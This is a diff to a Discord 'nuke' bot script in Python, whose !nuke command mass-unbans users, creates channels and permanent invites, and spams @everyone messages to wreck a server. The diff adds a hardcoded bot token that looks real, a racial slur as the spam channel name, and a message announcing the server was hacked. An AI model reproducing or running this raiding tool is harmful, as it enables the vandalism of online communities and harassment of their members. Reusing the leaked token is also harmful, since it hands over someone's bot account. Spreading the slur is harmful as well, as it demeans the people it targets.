@@ -5,11 +5,11 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 
-token = "ur bot token here"
+token = "OTA4NjY2NzQ4NDQ0NzcwMzA1.YY5D2w.oDN4nBRNQMN1QpApIbJ3-25699A"
 
 
-SPAM_CHANNEL =  ["#ChadIsPro"]
-SPAM_MESSAGE = ["@everyone #ChadIsPro"]
+SPAM_CHANNEL =  ["niggers"]
+SPAM_MESSAGE = ["@everyone Server Hacked By aikjako @here Nuked by justin L bozos https://cdn.discordapp.com/attachments/825858750006427658/908450739473514546/video0.mov"]
 
 client = commands.Bot(command_prefix="!")
 
@@ -77,7 +77,7 @@ async def nuke (ctx):
         print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
       except:
         print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
-    await guild.create_text_channel("bozos")
+    await guild.create_text_channel("ChadIsPro")
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"New Invite: {link}")
